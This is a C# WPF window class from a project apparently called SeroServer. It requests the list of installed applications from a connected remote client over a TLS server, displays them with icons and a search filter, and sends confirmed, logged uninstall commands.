using System.Collections.ObjectModel;
using System.Windows;
using System.Windows.Controls;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public class InstalledAppVM
{
    public System.Windows.Media.ImageSource? Icon { get; set; }
    public string Name            { get; set; } = "";
    public string Version         { get; set; } = "";
    public string Publisher       { get; set; } = "";
    public string InstallDate     { get; set; } = "";
    public string UninstallString { get; set; } = "";
    public bool   Verified        { get; set; } = false;
    public string PublisherDisplay => Verified
        ? (string.IsNullOrEmpty(Publisher) ? "Verified" : Publisher)
        : (string.IsNullOrEmpty(Publisher) ? "Unknown"  : Publisher);
    public string VerifiedDisplay => Verified ? "✓" : "✗";
}

public partial class InstalledAppsWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private readonly ObservableCollection<InstalledAppVM> _all  = [];
    private          ObservableCollection<InstalledAppVM> _view = [];
    private readonly HashSet<string> _iconPending = [];

    public InstalledAppsWindow(TlsServer server, string clientId, string label)
    {
        InitializeComponent();
        RubberBandSelector.Enable(GridApps);
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = label;
        GridApps.ItemsSource = _view;
        _server.RegisterHandler(clientId, PacketType.InstalledListResult, OnList);
        _server.RegisterHandler(clientId, PacketType.InstalledIconResult, OnIcon);
        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.InstalledListResult);
            _server.UnregisterHandler(clientId, PacketType.InstalledIconResult);
            Lang.LanguageChanged -= ApplyLanguage;
        };
        Refresh();
    }

    private void ApplyLanguage()
    {
        Title = Lang.Get("FEAT_INSTALLED_APPS");
        if (MnuAppUninstall     != null) MnuAppUninstall.Header     = Lang.Get("ACT_UNINSTALL");
        if (MnuAppCopyName      != null) MnuAppCopyName.Header      = Lang.Get("ACT_COPY_NAME");
        if (MnuAppCopyPublisher != null) MnuAppCopyPublisher.Header = Lang.Get("ACT_COPY_PUBLISHER");
        if (MnuAppRefresh       != null) MnuAppRefresh.Header       = Lang.Get("ACT_REFRESH");
        if (ColAppName      != null) ColAppName.Header      = Lang.Get("WIN_COL_NAME");
        if (ColAppVersion   != null) ColAppVersion.Header   = Lang.Get("WIN_COL_VERSION");
        if (ColAppPublisher != null) ColAppPublisher.Header = Lang.Get("WIN_COL_PUBLISHER");
        if (ColAppInstDate  != null) ColAppInstDate.Header  = Lang.Get("WIN_COL_INSTALL_DATE");
    }

    private void Refresh() => _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.InstalledGetList });

    private void OnList(Packet pkt)
    {
        try
        {
            var d = JsonConvert.DeserializeObject<InstalledListResultData>(pkt.Data);
            if (d == null) return;
            Dispatcher.BeginInvoke(() =>
            {
                _all.Clear();
                lock (_iconPending) _iconPending.Clear();
                foreach (var a in d.Apps)
                    _all.Add(new InstalledAppVM { Name = a.Name, Version = a.Version, Publisher = a.Publisher, InstallDate = a.InstallDate, UninstallString = a.UninstallString, Verified = a.Verified });
                ApplyFilter(TxtSearch.Text);
                TxtCount.Text = $"({d.Apps.Count})";
                TxtStatus.Text = string.Format(Lang.Get("INS_UPDATED"), DateTime.Now.ToString("HH:mm:ss"), d.Apps.Count);
                _ = RequestIconsAsync(d.Apps);
            });
        }
        catch { }
    }

    private async Task RequestIconsAsync(List<InstalledApp> apps)
    {
        foreach (var a in apps)
        {
            if (string.IsNullOrEmpty(a.Name)) continue;
            lock (_iconPending)
            {
                if (!_iconPending.Add(a.Name)) continue;
            }
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.InstalledGetIcon, Data = JsonConvert.SerializeObject(new InstalledIconRequestData { Name = a.Name }) });
            await Task.Delay(50);
        }
    }

    private void OnIcon(Packet pkt)
    {
        try
        {
            var d = JsonConvert.DeserializeObject<InstalledIconResultData>(pkt.Data);
            if (d == null || string.IsNullOrEmpty(d.Name)) return;
            var icon = DecodeIcon(d.IconB64);
            Dispatcher.BeginInvoke(() =>
            {
                for (int i = 0; i < _all.Count; i++)
                {
                    if (string.Equals(_all[i].Name, d.Name, StringComparison.OrdinalIgnoreCase))
                    {
                        var updated = new InstalledAppVM { Icon = icon, Name = _all[i].Name, Version = _all[i].Version, Publisher = _all[i].Publisher, InstallDate = _all[i].InstallDate, UninstallString = _all[i].UninstallString, Verified = _all[i].Verified };
                        _all[i] = updated;
                        // _view is a separate snapshot when a filter is active — update it too
                        if (!ReferenceEquals(_view, _all))
                        {
                            for (int j = 0; j < _view.Count; j++)
                            {
                                if (string.Equals(_view[j].Name, d.Name, StringComparison.OrdinalIgnoreCase))
                                { _view[j] = updated; break; }
                            }
                        }
                        break;
                    }
                }
            });
        }
        catch { }
    }

    private void ApplyFilter(string f)
    {
        _view = string.IsNullOrWhiteSpace(f)
            ? _all
            : new ObservableCollection<InstalledAppVM>(_all.Where(a => a.Name.Contains(f, StringComparison.OrdinalIgnoreCase) || a.Publisher.Contains(f, StringComparison.OrdinalIgnoreCase)));
        GridApps.ItemsSource = _view;
    }

    private void TxtSearch_Changed(object s, TextChangedEventArgs e) => ApplyFilter(TxtSearch.Text);

    private void BtnUninstall_Click(object s, RoutedEventArgs e)
    {
        var sel = GridApps.SelectedItems.Cast<InstalledAppVM>().Where(v => !string.IsNullOrEmpty(v.UninstallString)).ToList();
        if (sel.Count == 0) return;
        string msg = sel.Count == 1 ? $"Uninstall \"{sel[0].Name}\"?" : $"Uninstall {sel.Count} applications?";
        if (MessageBox.Show(msg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        foreach (var vm in sel)
            _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.InstalledUninstall, Data = JsonConvert.SerializeObject(new InstalledUninstallData { UninstallString = vm.UninstallString }) });
        TxtStatus.Text = sel.Count == 1 ? $"Uninstall sent → {sel[0].Name}" : $"Uninstall sent → {sel.Count} apps";
        ServerWindow.ReportGlobalActivity("Uninstall app", sel.Count == 1 ? sel[0].Name : $"{sel.Count} apps", "complete");
        ServerWindow.LogGlobal($"[APPS] Sent uninstall command for {(sel.Count == 1 ? $"app '{sel[0].Name}'" : $"{sel.Count} apps")} on client {_clientId}.");
    }

    private void BtnRefresh_Click(object s, RoutedEventArgs e) => Refresh();

    private void GridApps_CopyName_Click(object s, RoutedEventArgs e)
    {
        if (GridApps.SelectedItem is InstalledAppVM vm)
            try { System.Windows.Clipboard.SetText(vm.Name); TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.Name); } catch { }
    }

    private void GridApps_CopyPublisher_Click(object s, RoutedEventArgs e)
    {
        if (GridApps.SelectedItem is InstalledAppVM vm && !string.IsNullOrEmpty(vm.Publisher))
            try { System.Windows.Clipboard.SetText(vm.Publisher); TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.Publisher); } catch { }
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();

    private void GridApps_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
    {
        if (GridApps.SelectedItem == null) e.Handled = true;
    }

    private static System.Windows.Media.ImageSource? DecodeIcon(string b64)
    {
        if (string.IsNullOrEmpty(b64)) return null;
        try
        {
            var bytes = Convert.FromBase64String(b64);
            using var ms = new System.IO.MemoryStream(bytes);
            var bmp = new System.Windows.Media.Imaging.BitmapImage();
            bmp.BeginInit(); bmp.CacheOption = System.Windows.Media.Imaging.BitmapCacheOption.OnLoad;
            bmp.StreamSource = ms; bmp.EndInit(); bmp.Freeze();
            return bmp;
        }
        catch { return null; }
    }
}
